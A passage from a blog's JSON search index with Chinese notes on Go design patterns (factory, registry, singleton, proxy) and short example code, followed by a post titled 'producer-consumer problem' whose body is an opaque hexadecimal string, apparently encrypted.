&#123;\n\tcc.cat.eat()\n&#125;\n\n以上的代码就是采用组合的方式而非继承的关系。\n工厂三兄弟工厂模式的介绍如果业务层直接和基础类模块进行交互的话，那么就违背了单一职责原则，一个类即需要进行类的本身操作又需要进行实例化。所以我们在业务层和基础类模块之间增加了一层 工厂，业务层不必关心基础模块的具体实现，只需要和工厂进行交互即可，工厂负责基础模块的创建和其他繁杂的逻辑。\n工厂三兄弟为简单工厂模式、工厂模式、抽象工厂模式\n简单工厂模式中心思想：\n（1）面向接口编程\n（2）把众多的基础类进行抽象，在创建的时候调用接口来进行创建。\n（3）没有把工厂进行抽象化\n\n弊端：（1）违反了开闭原则\n工厂模式：简单工厂模式+开闭原则&#x3D;工厂模式\n简单工厂模式是把基层类进行了抽象化，没有把工厂进行抽象化，所以进行开闭原则的基础就是把工厂也进行抽象化，定义一个抽象工厂，然后实现的时候有苹果类的苹果厂、香蕉类的香蕉厂、梨类的梨厂。每个对应的工厂就对应到每个基层类生成中去。\n具体实现：type Fruit interface &#123;\n\tShow()\n&#125;\ntype AbstractFactory interface &#123;\n\tCreateFruit() Fruit\n&#125;\n\n上面定义了两个抽象接口，这里分别是水果接口和梨接口\n下面的苹果、香蕉、梨都实现了这些水果接口\ntype Apple struct&#123;&#125;\n\nfunc (apple *Apple) Show() &#123;\n\tfmt.Println(\"苹果show\")\n&#125;\n\ntype Banana struct&#123;&#125;\n\nfunc (Bn *Banana) Show() &#123;\n\tfmt.Println(\"香蕉show\")\n&#125;\n\ntype Pear struct&#123;&#125;\n\nfunc (pear *Pear) Show() &#123;\n\tfmt.Println(\"梨show\")\n&#125;\n\n下面的苹果工厂实现了工厂的接口\ntype AppleFactory struct&#123;&#125;\n\nfunc (af *AppleFactory) CreateFruit() Fruit &#123;\n\treturn &amp;Apple&#123;&#125;\n&#125;\n\n\n\n注册表设计模式例如现在有各种各样的服务，每个服务有不同的操作，那么我们如果现在传入一个服务，那么正常代码肯定会进行if-else循环，所以我们注册表就是为了解决这种多个if-else循环的问题.\nvar (\n\tonce     sync.Once\n\tregister *Registry\n)\n\ntype Registry struct &#123;\n\t&#x2F;*\n\t\t其实services中存入的就是一个服务和一个new函数\n\t*&#x2F;\n\tservices map[string]func() service\n&#125;\n\nmap集合中存放的就是一个map[service]new函数，如下的这种\nmap[ssh] &#x3D; NewSsh()\n\n单例设计模式单例设计模式不应该被单独来讲，通常是和其他设计模式来进行使用，或者是线程池，数据库连接池。日志记录器等\n注册表模式的问题注册表我们如果每个都new一个新注册表出来的话，地址不一样，所以无法实现注册，我们的思路是，使用单例模式来配合注册表模式来进行设计。\n注册表模式会遇到一种方式 注册表的New函数接收参数和返回类型都是接口类型，但是返回的类型是不一样的，比如实现了接口的ftp、mysql等。这个时候，我们应该如何去操作\n\n\n\n\n\ngolang的代理设计模式其实和java中的代理类似，代理模式其实就是代理模式。\n\n有点类似于简单工厂设计模式，我们中介其实就直接进行了实例化出来，是个结构体，这种适用场景是很多物品都实现了同样的几个属性，中介仅仅是在实现的基础上进行了加强。\n","slug":"设计模型","date":"2023-06-12T07:24:39.000Z","categories_index":"","tags_index":"开发","author_index":"Q16G"},{"id":"35e4bdf3cccf47af2799cbeef79306c1","title":"生产者消费者问题","content":"\n  27d97ea9fb3e97224bd596180dab7c8a1c2e1c7ddea31e54a8a96e69e4d7f164fabfb9235ab619735ba90a46b834019b39bb7fec9a301056f7eb96f7b65079f187992ddaec38656203d61e229a0a389f43ad6112364b1efe721dc8309b6299fbe75d5622b6198a114e5a67992ac2c85bbf9a9abe179cb2e6323508e3d56487961d4787d134856ca672c695e8099575d2543f6556714172e54626c238220cffd3bc94ae5cc3059959d59241370d753f11f46c4127cb4b225304240e47a398c6d8f70da2f94085df929d04d9f2dadfe39a2e61a883c8e6928e2aed4ad39866ee69a0b280daac150d7cc0c8c9ba134a44c769baadc3ec8bb555774c1e6fb08310964db67715087cb5c8d433a310102d8f27753048909392aabc5c04033b46f646cb701a6a883be910f1f5d81b2be5b88c3b22f496ba84683f91d41c4099e4ca99bee9791552e1508d68275371cc5d17df83b32870c3ea2106e947606b40a06d90743801436efb004e94d663db5c66c0f6bee383a574b6c7898ab1b547d7a4b1153196422cbabe1b4432c3b36be9d5378296dd14f13c0d65c11a4f287085fe84c186d0b68a4326d3ae9514f96484250114a47810a8d9f79968419a3996eee62da03a19427001cb77b8eee54fa3ee38960eb324edaf94d22834e5c783c046ba5728c0a088c682119c76da1779c43fd217ac87ef22aeba19f7920b7b60441cae609d77bd22dab255e41878905825a31b6fbd0b58486644a2b0f42201ee2004668bd0d08f03492d68e0548d4b34def6e9b9cdf6256f950e9380daec8e22cb48f9492c785142b7c3367e639cedbe8b23d284ba689382b22fa5c73eed72a819fc6a2b7c1cd09942e676f71ee314ecd6bfd543d37b3d5a0a90eee308b8af29a3a39dff77712554680aea9a9f5ac68e1958831e0ead02c0ee0474d0e8164c9960d29f3047159f571986db725a1000fcdf5fe89fc481e26d8eb38399079e321145b925659e1486243449a1ef69f93130153d2053f5567ebdcdf60ac07a092713d2d98d481f26f14ac35635600b8c4c20234d8dd1d881b30a698d7dac0d79a5feca053272648eb2b40c0011941f2a9803653746c134f4f2240dc77cbbf3422b8958d6c2847332a3b823e7ed8c4650d7f9303ec225eae6c3991070d9af1263124a5ec19e1768f3b50a3aa44c934fa8f21d135cf79f3ec159d2a7107732dc10446a6c781a51c312c1d995b3cdcfe2e1b6252c8fe6821f8670c72424d1dbb1918bee158cd47c7f05a512bd96142e93ceebf3faa8137d80a3c5c69b17d1bc20c6284b0d05dba8a701b13613f722db83b52862895b2402ff9e697ae69300dd5c57f0c08cf443d472488cd924b9df05f7dab4b43da1649f45d4395d42dc342ba34679d8a0262c72b4c413f2040c50787cb04e85d997665e4433da7e9470a413b98a1d783800e140f3e96b4629af80e9e0e32043c58511fbc2a823018e5837bb76de8811e3bd560cc557e672d17f60ca0f644968750f13db1a535a8f9d8e7e026accad86a44091dd8edb0fe59d2f2a02de6db193afbc60e15601a43f7479ff2235b50f2a22be5a84472caa2a14c5de47383fa61d390f7227e2361d495f28c74e56f706cb9c903f1d909e6855e1bf1f3185cffb791462a6c9b7f421d5e847531080d021f183891e784a8de8029946287a89b7df7dd5505a7da30e941ca146996da0d781fbadba33f7e2569750fb6ff44ca34e4724ff367b4ab12364722f0bf942477dbc4330f58ebcd46c7d6605eaa9b5daa79680fad6ea9ae5fe4d482e624c6e1e51bc7cea852c3ad9eebc63137a094d19e5300607ec465db964e13fb1fad8340c216866109cfb18b2ebac08294f12bb34006a30763f83a413c59bb6f1f65789392b71827548fa20b22965bd851c4ebcd87d9cda0a4c85071a0292a7b19ba9f3f565e83760822cbe2f776b6b856552a6ca11775fb8ccaab8aa1c39f71d202c0d3f1a11f1cb0ab80fb25bc50b26aba9fe953bbb3621d65ca2cb8ff67085d4d1cacb9a3ce2a6f24d1ede4bed39115ed87fed617d0db4e93d9db053fbc5ff4755c5d89952b51a574da1106fc99ea0792772b4d125412267d1424d0408c1167d55e0e11006154c5ddaf947f69dc9983183dc910f3ffe2c3b36d8ee821d44dd232334456dc40fa06d96f3d99401e156e50deefd9010a63c6c4b8e07e46d1b5f020c31f651aa8bcc1cda9dba61afeae445c214f995d9de3527b41f016872828fad9209ff86508f6437d6b7752a0701d4b52d3510ebb3c38ef70258c4f21bf76077c8f8820294ed03ce4f11e1a7ada3de96ebefb4ff2f06728a0614d00c0d35637c13d61cb1fa825fe4f047bf1f70e9d3bc76dd98804bbf07846593825dc6c3dcdf078143137e22d267e10fad1ca3c72d3a01e211d7875a14219d2b84039dfc6875518863ac09dae557240962c7dae19bbdc77fdab05fc4e9a9979d8c5c76ca129928fda3f0a86d7f3ac83cfd38ab599b31249731f0330095cfda02190b0242ab28387b57d5fe56bb4586df79dcf2c924e7cd5e422c3d84e9301fad72dccbc1ae1a8dab74dbeef1c30bd5b2e7fb19d088634a2558c24f94b8a7b4b1ca4c7e5b3b661099d1e63739bb53aa545db46fd093a79433b4006a9c2fac21d92d0c45a5f79260aaff215f88bcb9e4388c373c55cc7e49a8d25a912901c6dd9a2ded3f0435c9705a1fd9446b8d49892ffecef693468abd171b0e6daee923c5967410d7c18715276a0ad51b03e8fb00729aecf86f73f495456fbf28830e7fff7cbbf2373d13709156d240736bcc23fcd6d078b775b2e2962194505f19e4f74c9c3edb0fe763443ad15cdc5c133d20ce2e800810ddc561cab5c18b11ffabb25fab1013e78e35cfd7c78ac866f99009254bab6e123e9fdff1026c9fd95f15b2e922b6c26b9965787d424fee5cacb2c73c9004e89cc653effdac9d472fb3403c3b254d3bd3894530664603a646567a742f93ebad91f1ea2115f03fadd1cc9486976f7be08ce327f95878b9af56ea93fcbe6cbe8c2bf5b9199b2c0dc75ccb4bfb1b792d6076da4a0666802d8666e6f138bb00634f4558db1085a4cb8dda7dfccd4f014158feef458fea5b32ef203a2861ad8701e97244bc33e956b3cf7181054f7bf78fd723ef64ee35d9520f3254103d3f708a94d26c5bb4ee4106b75aa0a1db340e7da45cf35f492b6958a9596d62f1c491eb57fcda0d6de937a2c5da1a9984d3335fb37f639123de751b2addb7c4886623c0bfcda138ca5ada900dc48db648d7321069254534eb76a26452b57c1c3d420770d0a5f68d88b11c6f096c333b485bab5e25fa20330d8bb5f017bce2bc3fb90b4d096ac7792d47d42d2fd386ad26c0c8d036f09ce213ff40a9312e4752b57923a23e97b2fb15c63dd0a98a1cf41f3e258fe39c771c9fdfbad82e0cd01fb0ab58b52f2da8eddbb58fa901b38dc9cc978542efea1276be3fff7562b54bb8b00dc62d3e16fc32ccde027ddbb6be59a60ead02b8aa4ee431464cefdd8b27fa168ee735b533dec25a464f67a8088844da78a15f9f2c230ded124969e4d5558a626853d1e8e7770773c68f6d68821ef8905c0c958b77b17813309054b66fa65e2fd9cf8690718f8c323ff15c5ebed27dceb0f28ce091b35d7e3ca40f64dd05a66971242535c74239768a3087b77ac3d06230db15ab93beffd6ae956f4ee69718d1215eaea54cf095d65148eb5199ff7edc05a36cec3c0a8ec44b6284e67d04dd55c8796d9280616087d94dd3ebe6e27990e264072276cd24d48c7685ed17d1b25476a2df5e772209783f641534debaf2db89f4d778c8273a4f0af94161956f0babda680e91aea4280445236ccfd6d5bd047fff74f53545ae351422213b18c8686e64e57695d50c448bdf1b389888c3cc436c4fc9828375e46961f98651a469c2c7607e0d8ac582f162c5037f9f6ae5f8a0587dd8bcb27e246e801a52a6b075e78c5cda054d20dfc14fd6b04ba45e66d3c2824b5dc0e57bee1bc577e6d3b73a409eed1a9993d10de027433caf5b88b692bf86843f3900c682ac7bb468c73d0d0f558df692e1fc766d24374ca06bef1f02353078735fe49d70aa86f0f419eb67acfe1c3a7fc697d415f1a6c99128fb1f6e3bdc4b788f030adf00b09f65016afea09910809cdb483d4bbd52479b8c7f05ce6ea2e0e0281cbcd45e677929021342cab86a328d701a7c4b6c2cc1789704d995b3aa666acbca68608a95c19dc41def971dd7518bd59237819f7759ca3ad9631c88f6bc2cefdaf3fb28024ab27f941b06714e1b5d7447cdaa01c9523544d466c569ba5eb7daaec655b7f55c5e003891e5ef768025c16b294bf4ac698db573074ac254a0b87ec149e9bda30908ae1467b815ed4c150d8480c1d19e9cdc293c87103532a7e193c5e54094ff24312a58b486e344c6fb95891629a9f7c303c9393de9f349946633cba3b4ce2b118d532b05fd66a7294627f95f46aed6a65d026afe59b160680b8c05c42529d44f37be009c47f1e10f6520f68131529b6876af7e2a6741034d255a86923ce3d15e5702e47ac13c2062263e4f9066ebc1d10b63b3e1e6bd842de40beca8ee530da322672a9486a97824f8b41c1fdb0c59125e8ad82dbbd49072a573a97a8a0bfcc10886624dd58acf5c864b20499ec03443c7233c296d1c470e32b490906f1e97df5e97ce70c7ddf4de18891c152720f32805dcc4594dbbc25cf3a700da82feb8db9e585e12b9d5b6f83d651e9534ba91d8f9f50ce811a8abd1aebaaf88a8788578e1ae65e68163bf073cbf703f94d42307b80e28d8dfde1656238209038e2d31c32f3264e7fc7e170328bcf0b12800952a31d1e046f2417ac36afa32530d84d86e16900493e13fc0d1c3c9123beabc8d1747da7d6ea3fe2fb32f576dd05bfbe36ef50e5ff33b3da016b789ac6421b484523f7092760df3e08a4ee8a11e1d892d4cc1f61500f63e70c4136dd5a35bde9e85497c9ea565c89df9638ca950e44848d84f1ef929080a0dd50840677722d568a1ee3139e42e290c3fb7f1402002577a5e5042c22f061c8d6d02d4a098d06933ada180f3f8f4c3128c7062d457102d2439d01475f10b82e88e09366fb66b262593763de507b521aeab9fe8643ad447ab327de68f7542bf742df916c65e002533e695266d997f7bad855f6ef69dc5975e69316b3dca427958d6b00c0632322a444965142edee53bcc96f70b4699d5d04202e2c14625d9a21f5c9552c7b404243567a47760e40beb99ba9abbd433c6d1f2167d6c043c238c22270ec6afe13f9b6a0c5e27cf215bad46b905c22293d2f95e5bfb72e9addea962c20fc3bce1e88be8b5774c7a5833f074104d633faef2930869a1213a44be78030dcb62158aca183a76eeb0a4928a757ada6987b0447127fa24f764d56b73adc199dce8ff2703a55fac642b60313022984c2f7cab42eaed33f06f5d673e31eaffd30b9d8ca88d692448ae3465ba4599ced26105ad3ad7e19d4d1cb42d5ac8522ac490a156b22f588fc498f09ee948b4adfb9a12a37363934b0eefeb50bf23acb67336a65218b7c1b23024ed2cd41aba6c3de57a5fd381af0c26788d562a403d2586222ef914bd9436056431297d7aa4a7f94853cb173d995a5f35bcfb9ecbd06be8d9ae1a2bf5ddd3cf6c2c8cd0d57a96b17e945407768cf3ac398c842e7d3fece6156d2cd1cef155a5e94c329af3443b1680a91b1c860bb3d21e3975f0e4a9b56c1407fcf59a03681c0016c4f96db24e66023a05273d263d05d9d0202a4964484d76eefd1fec1af79ef219f3ccde0f6db3cb79dee815136c47d91b1e9c4ccce90cfd21eb159f648aafb2b4fbbb72d1e60e9fc956437834a94a2e9a78c43a998ae054ac793419d328b62a067f72c1aa5aa88c382857a6dd214644a22fb57435969f53adacc3662fdb80664aac600f82f91cdc13e46d87635012dbc28401cdb60eacd27520703f18cd7826881cecc1c3138d3c0466128b6fc454a98cb8f0683825897840d199028cfc55728d467d9b6f00f24d46e9e13feba09c14e9f658bb00610e5f91fe30ceb6a5110c88a532b06320e2b3bb1de05dc55f9d57059aad9fa45fe1d837a1f72e7aa27e6c695480ff5cca7b4795431e0e9e5a74295d5895a795ea42e0e64f5873433f8282b4c0ab4dffc8779c4efe132065cf1653d3a3ee68f73dfc9f87aeead2f1852d18c3a1237471e264f87205d3726a3b0947e4c3ea51bb5e29d994a991c02cfdf1adb7600b50331abb6c02ae66ff02fa798c5a2028a0f1aaa9999f71c40c637c62d20fdf4e9655176f0d2bffa610fb44334c88316cb8843cf949289d2c7f8b91042410cf6cb9d46e3b84266d60f1a212a6e864328fe8803d137859dc72b72f0e5989eda3b726c43e5dc76a12a3fb0c2064c675edb9661c9dcecae27f3ba025f4980043a33bda0615b7fb07d838af58680e901d3e89716035de87d290da60bbff21493a336cccf7f4070a0fd3a8d862cb9261ed95675d513ee1fac85a2cba1104c6dd848b7b0f83d2a27cfeebb5c0c558f11816bb291784fa9775220923010f7c1b62274566919e85200aebbcf02153f88b1075d5d1e37aeda1416e5bf7f202d3f0f7802d422725d46cf588847e7edb4c1fe5f0bf240ebe6afbcb0c8a1879d4be74ef94e5ddd6a59f7a4a7f5fab7b70f42ce802847a8386a0a427777d237db2db8c5097d2683980d76b3f7de9258822035caf19a352fb7170ca0c089cedcff61eec8d49479a39c68de377217a2cc40d48f5561f688c0db5ed25055d8cf6eab4cc21fb80c4d350fb1180e9385aca032d6fc6292c7ea4594e00ea6ea1300bb6a49a042c7b67bfc12b6645106bc3391f6ab63f0d07119a2233b8ef426c46567fc6e5cc87d5a622f7573741f43b10e6d5a569d46554b8b4379d3fa2f688142571d399ea2a95bb56be4ba9826de19b8731db8e42b99d77ef983f31f9353c0283c0bf94669fb5dd65d3dddff893d51c83c8edf5ee011cd2b1ef90416d939841ed7d4324861abdb10115c8c368b4267db1fea772f00112e78a076eb5fb11ded348cbd658c7405dabda2411ce22bbab3835366e9e44b497272b8b9faaacd66654c70c471bdd710c14414cf1a6a785fa46b2942125c9e368d9beb3e19d9b5f9b96530239de43ca4c1e4a8f7a2d3cba25eea512c30f0dc17d5e25c4d237d01b207d71fb1224fe80057b0c879ffd61a67250a9e810729ced72904f0c23181aeec2a4f6438f09754bcdd242cc919cc6ae8be55fd32aabe6b825173725b7b167b848d0fd59ef0886c7fb52cd4dabc1dda07b8e7b6d8eed8bf3a4e422a76ae470a4ce02e42c40e683250f01cf58e3131d0861058f0e08cb41b4842cdcd4cdad7e71426b0c73ef33a72f389876c77df6a0b3cb9ddd83222a8ad2afce976266099e246fc928fc2776030d3bd9ada16668b18519c8b404b12130e5d210841fee965a7c909d1cb281dd089b84b9834cccfcd70ec8efd96883d63436c90aa8defe4a481b25a40a39b6338c15236ab83354c5a811525e6b3b3a46eddc595c39fa73955dcfcfaba70c2acc17e8f7e681c555c4e005762e126003d6c9f45067c3525173ba96e097b5fdfb7e7dfed677ec05f9d8b8aa0b90df5b6c4938a6d1b9cc597a91f9a2ab7127fbd43a36174141706814f112c3d455fbea4444372f7735d0226c6a7ac94663d5ff645bffe139c900c114859158fb122e18923fe33c5e93cea675b2970eda6c5e59c34176b574d20127cec0b739f4ce1c14f52f91b37d59051469390fc009ed9bf985d8b383e4dfdc43d220c48a62d0c10cf4ea2ec5ee6785203769a510f2c3a37bef558e1f33722c9b0a2e22507853f907be2beb868bc0faef32fa4a49b68663e582efd748ad3befcf5781407be293d0e757864a01a169144893965f6c63c1b2e986677be9e16129d6152ada93937fe5a1e6267761a96030b5991dcc36e697a9d6fc7741df80db11861206d80700aafe33b1202f8d92e8931a977782f185f03baa86f8119a3019a340267ab4666668ff7613369f2cc33b33fc7596d9d0120e5b6fa63f1cd7d2a209385dd74c682528f31b41a233cd3973c3a60f9fb0d4394d4378e1935306b79d5750a34c5698b2a387b8d471e8c795e226541adc502ed400f58cce5292f286e3393f5d910aff855762fe8cb483042b18a1ea6272fce61d7bda7b7bbfab57d699924a6dced7a03d49dc6e6d2160b1b0f229048b2bcc61ff14582c68ed391dc440592e5b7b9b71dc0ebbaad1b0062d637ff6f1d3c20f98b8feccd1f13a7cbe815588feb85e7fb5aa0415de9e49e0a82428239b46daba9519354de21027f06d029d3c603fddd16d4bb5f3f2123502e25b9230797b492b977133394f42656464866e08d558d317064602d2bcc062331f5264842fc6e8eae7f236ea851fc7dac8a646ece378706992f43ed2fc2b317dd0260a86fb8409ea936932e377cfe74961a62d92b10123cfc2d8dda510c64be887ed115848be33ba6bccf8c3b1b54e7b760bfd771f63de47caf7b054c058882284df2c8d4dd245479fbdbccb291e72238823c4dbbc34ab2a3e1a71d8324a424e0f385735777d8ee51eb17ff0b329fd78da6747d0c80852fbe12574e7a3feeaf041370e322f23c3a58ac9661c797b12fdf54ed48eb09a1982ad1f03255607fdc2b812035967cfb64e3ba861cd512d011f71926d0e9c7694d10d0178e29e35ee287462c63e9cfbc91ce7a19b9655ca60738d9c4ec89a7dc7d6cdc8d77592186e891c6ec90ec5a268cd55fe5bd8edaecc33465c8f51007774e9df6a90b491089dfa90c5e6aaffe898da2f8abdcf16d0c26188f1c634f0e53c2a021d328e5313e2ef7db22ba757d40b780ad7b8b3844a43eb4b40627c38a77681e0375dd5f2875df42dd378d2dfa6f1a1c74d062cea4d38c564162617a19519957a355b9b5f40c6ac38eba22c10d1fd2870f5f183a45b83b2b4f7ec6df8a7eb5d2598a181457616f9018dd48e801e5e24f0fd0bae0b229ff3cdb89a5860c68dda39657a72d3fb0d675e401a9b79ae3adcbceff30d6029f893bfb885aeee0a509708364d54fdc473df8a771234de70d1b0fd91cbd67d1daad4585cfb12d978b5353d56947c00bbead652edec73454203b6c2a4a9d6cc405b9866b49582af14ace13d1290122bd32810e8976722bd77df7a00e526ec494a9ba691c57fed628ae67a7a27823178c8bef713441ab946bddcc69ba9bb1181863ddd3200369010ea2a7f6c1d1b2e0bc5eedfac8c1d8892a0c34eed3a00253bd6a3d2d48442adbf37f125704a6c717d21315bc19165dfb92c7b25a641765447e16e160d1bb8f34e90dfbe2a36648cf0b855cc82c71067e2cff09575019bcd31f12662c593679c9561edf7e890c15eaa56c63b8fdbdb5ea3ffbfb490ead08b02669fc1388b51dc0206a803f6cb34d64853045479ebfe87d78059d18e1b54e664a09f26f6e22bf3ddff016c5e5adb5d0907f903d616774cfd40913c84a8335f8353a11784fd74742e0dcc461121172faba469a15b84c770e1a8473d54275350e67e0a021af0dd97088fe7a273051f80c793933e83c94726c3a12e53e2384db7fffa84c3200e5a0249950c7a511fecf14aa23a15fcc1a09bff945fff0d4d42d887f381141da7906c0bad712450c11b1dddfdcbc1bffb6594be31ab03e0de670d66c6946997dbba67d6e9723dce9e9f8622712ed7e81732ab2a51f940cfee5ecafa2eb52bcf2853e20922593888ff90ab763aba1608cb607d56f010daf6139e6382dd035819057c0e166c9903c13f8545e7851b5844051308509a4948116cce9075ff99f24688859984062972c3236c59d09a9b42f72232168bb9c4920df6296dbd2e56202e4c0b2b4d06bdf4c07fe856f7f75b4caee68760352834e702c257fccf60e58d2e3b67beaf1ecfd4bb3502b57ece9a8641fd7e43e055e60ee601eb2714fd4152480a8b83221c8c8e7313989586bfe9368e9da0b9c87fe8e0a9b67049df0e27b84f2763961c051f5d115d73175a44cbe807666a86bd208cb69dca5cd3bfd45a171b9c4527412ec558ae0c6234f7b102b8ad5431ff7e57c41b962da1740da2ebb544ec12e9fba25a49b60654d6ceac6ca34bbf225eb2641a6ac1438a8df395929c4b4963baa7fb6be88107cc83dd47005064fc6b30caf5d201d8e3bd6990a5063d3cba70e50970ebeca4a1fb0aec40a8268be3b02581d31f1cdd1a7e88b618bff62d5ce646fc22fe9dd701ccb6980f215eeb6799312532ff98dfa746e732b6384218b083e246909fd6785226cbc180854c0ebcd801d745d869bcf3a4f06fa42d218c00685969b966a8f120a046f005a0b021a1eeed610da2bfd5560a58806bceed336c7e757a30ac703840b2f685c16681e3cdba1905c24b096be12b3f320759bd63a15c340a47e9db655c6ecc5f6737be82e0e2944be8ef9dd74edf67bbf9b1467d1bb6c511802c5bef66b5460e2d0104c54385369caece4b2ca37610fd5ca43ca5531769bd8180772f5c6688b92e6940b0ceec0dba154687f96f414e4dbc96b11dc4766cc1f7d41046e2a0dd936ba92dcd4abac1d13f5bb57d1bc92aac8f35fd65c674860082232f2b4da4c931345059c91c2e713d0eb6569e04e986b394caad4165957306122297475b2ffceb59adfa846dadff2621f7f6b8e5ff13ad6db42078834798002d9a60de8ab15ca029f3df9132966c96891f131de4e124f80c38dda4d723eba862209342d13e6f496b588769681e0aeba0a363e8c2b15b91135247b78c793b110f09e24a10cb35f0e6540543304cf06189682d01718a105bfdc8aac53327566122b273c4ba94c1824237900c90092d55a972027cbb732ff446443a67c92b5e1146dbf44149d40cb1581417d8d2e55e5d2845f0a47936a1d0d67d974459bb8d271303587d2c6e10658d7f419f92337aeecc7727ea0c552ca1aa96aff0c7f7da5993ae81f8a165e1b217df269f78b0c17327b52ca4eb6252cde1c8e894d7043f51fc522747defca5a778745db707ef0d05e3d0cac5ba23434559e932d79d9b03c5ec33e18dc60fd120d096d784db03167a22e263fb74558862fa4d806f65d1dc7ec5695673e48c4e947526ecadc78690bb1c801c8b2e9a654f9fad97aa381488f53fc4fa69e8e9a2fe21b7383297e90bb2006c2f3e9235bd17191fa7d9f09e8992e9630579e056803e7cc49f5587e5b9d59856cef57d93b610fbf0b491c8ef72dad3a009cdc53ba35a5f794da30a321a8ebee002f1837eb0e3de8fa0dc990d3166f213de61dcb6dbc068cfd541bd923b58bbde78cd104fb1ab3d9d2d1e976b55a6ea15f3622522b50ce6fbf6c9573c18375ffb8b34ef9fa4990d882304d02c03c153eeeff087687eaf28d05e3a6136db8b7e72ce257b852db707d5bf14e4112504ca7feb0382554493a0846453ba0aa06d5ae02f4d25416ae3c9f056ec6a3a3cd54f97aebbe74edf2e975ac522535c1e96f23f79c42bb335211dc8f1b68d865c19e8d2696ab262fd7250397d60a67026470e3cae28cfb4d9741e853e72f58f9af51544edbf7f1dfc7e003928c08da977e28d963275d237bc06ef9984dd60ab9fbbb81c44e4140c542aabafd50523d9887db12fbeb3ffc60b01f0cb2d786708d65c8237aabb7fdebf32113e535db828c1b547a4e6c6467b9c671f9f5402465dc3ab4d96036b47143ae4f469ff044128308b9d213a47752c0eab9846f35bec12a268c61c094d93f2d84edffd132a924e4974b602a79e5e4db71d1287eefe89e9b6d0b34b1ad6605ef03e5580a03229b9203c9f5d356f142034afb8757222fd28bd8ea20aa22a81bb6929f6bdba02ca31ff9502ad9b430f4961b0198987269fb0a9dd4f6dad2a823dd893826c43cc697386e87e21361d7847aba8825de2e3e9cea644dca29c654a543f22e5d142bf5b10302731cc0fe94141bc0ac5ee474f927064b58fe68da6edfd2ce40c126dd9a033299ab0006701f9b9a1c6c41fb74a808043a3c255ada0a0b60debf041f5ee5a97238c6bf3470c9e4231c3eb67fec494e52d8c6a1f9719803eae609105466c67d80669384d18544eb6d98d22d65c4e61ab6cb5c2090313f7f42f574d5674922d320f66f5e409d2082ef9603b98f8d5b93db1e1bfb1e80c9149c524a20faffbfa4feda15cef86996f0faf2825106af404919b095a8d2288783eb4fb48778b009f438b1302e7e61f8f6331cdc546053c0457509697d5b3038109334113b770ee42074426cf890199a05bb98eb912907714fe23d1db2869adf3d0a22de9f2b32ba74047846c193b00eca548da6a33d0258fc9438fc1ec804c6131108d15f29c2f10b3c81d9f9716925dbd805e249a48ab54de471d68222498df8aade0b14dc74c3ec38beb6e47872bf1f088fbc9d6e05a517b63db5536148de3de0eabc38b4edd238d55b910936d9ad3bea1df8fb66eadbe69cb535856c70c515113339c8237b909b8630a1b8f4a98c7c1abf94d874e5033286cd7e727e1a30e695dbf871558627f1135ff7a78af9f7e405f635d9da5aea0a6be111c8a9c8211e3d0530dfe028a3781e2cd3e5198e63076dae5b52c55e59eaae57024390f2e4f4c5043732281d8e3bef4bd9494606f174757c1fd48e462d6204895ccafc66c2bbd67ab1eed3284d0e42c8b451889a12f9611ebcda7047de7c1583f738953f0e60bf9777676bb2651d284eb9c897d99e78e7551cf48e053527dfacddad25270d631a19199e1ff804b0c2a68ccc19d746280c672ddebc3818eb2475f45521e9bc109f5a97e712e6968de34cf63b831774d060b839b42bfbf32d1d3de07d769fa281d3619771dae308e9c41bf4679b15df913e344199573bdff3086bdd3fc44f40c6bd31db597d8ec2f6348bae43f04ef8b763b9d0737ef6a0e14e8d1df4b4ed10bdf6a98c588c6337225bd40076a88cd6bd05a9f152cace9b492480c6327819089d6dab29d9a6a0a9b35b4674669c50484617b06455c015328bbfa5a057a9741dc02e3156cc4c5892a77b77497d7b5906c376bba9a3712ef73016f295b513c64ad67a5a93d5394ce8fd47963a77064d8a4628e13ca5728954ff4d06959976b4bbb06fbcc0115d2c5a28b82ac9162b030318ac91de526de1f7ea56098599f350ffbaf084e5934861286c797f6e3ad2ffad34c101b3f79c4ddbac8cd7a74ba4cade69da0cbd093e08e55cd881f5984c9d9cd55c221934097f47d2051e7402625aabf143822eeffc4957ffd32e478f009a6fad4f7b00eda69e5fc4ebb37ca942e71702d0fbd57a2ffc10a006e5f8b08c57974ab2df273a4417d662b93bdd26eba332fa5817f9dd6f5d742d372551b71ae7576ac75bb5d3ef9fef82b96c7d19875c9aefe6a2e68da9b17f90d7f7e2e2e42d7caafc9aeb6312cf9bb468b05ff34deb417900a4675f18a5076f71008654aecad86f19d96dbfa5ee44ca34b4d6203a02fd243697b946650af0441bcd556687374bc39a7d98d3ea2b04603f80f591ac9fadb9f1f93ea0b2d0dc9bbb257b604fa6f5db11d15a504127646b7066bf83a7e978ef974cca80ac33a9b0b5f0d74665f67bd7c5c8b9f733f637c241d4edf938716eba143cecf2c3ab4cf7fe8be329824084fdf657dc4d3882c613249b67767f3cb80de00febad12d999f3b7f9cef08ffdb6c5618ab1d2c9b998c52c3863a45a59af736ec8b6f2b4d52a1016ad28e7d0e0b42111af17483fd444d7e88a5f4fb6ad96a3c0801a610335963109f8fa96ed980ab13eaa0075e6c901225077d9ee3ad804c9b18b68f8bd208842a78994bdd6336e98d9046dea7ebd595467a1e39395b8c94a9d363f107124b57116e394e6fe75628f83e82415cdec24534526d5b23bb5bcf449472c1e4766e674a7e22243f328680982a82bb4a1abd34a25bcee60ab384f56222ccf7300418a5040226a528206490c52b0e5bcb61bdf835ed6c7a69065f095577bbcdb2081cf43cd61dbc407acd34386aeb926560e2c2df854c9baa3e800834caa414aa8d86afa8e698cfd79dab23c6776216309e2f4ecf73db735670a88d7aa08660dc4fa5962a5984ebaabf26078d0837560572e9ed0dd11910982d48bc11fa34ff49cc74ed96562605190e73873481ce7d418e60f31ff0daac65e92a83c62860ceed5cc2e14ea00ee8cb36f189d7380095c0b83e7a84e16e829c15cd94b29beb6ddea9f1b3dc56af42443c39c196371d5b6185da3081ef1cc331c2114246adbcfedd78dba443b4b975a37ae2ad96144ec72a5c51b2b0edec79da82648bb71d727d9309048c52b32d76d31f26d8216bf4e4ca90e476771630ba5ba97507dd4dda66a0fe16c95dd2ee07404d16627099dc3785a508c7a28cfbc100712c820ac97edaf30cc274d6ac21fd3ddffcb259ddaee9509975b9b5622a84de1b7d4186e3aabb431b70b25431c0d02aea7d4e9c180eb320dc6f66df723d25e915ecf4d2aab853cc82c31217b9b7ce31affc8d03da30ac081082118b56532c94c2c1ad8ccc595fec639136c8829a8cac082813746991f25e67539fb86766538f89ec396900cbd39495dde2d45d3f46ab84ea43c819a92b3f90bb11460071d6f21899ce91eb942a03c7f8728bde31d33360b7cee7313a0d78761d334b03e6dd5d11d21519ca6bdbbbcda4c127bf211b5adbcd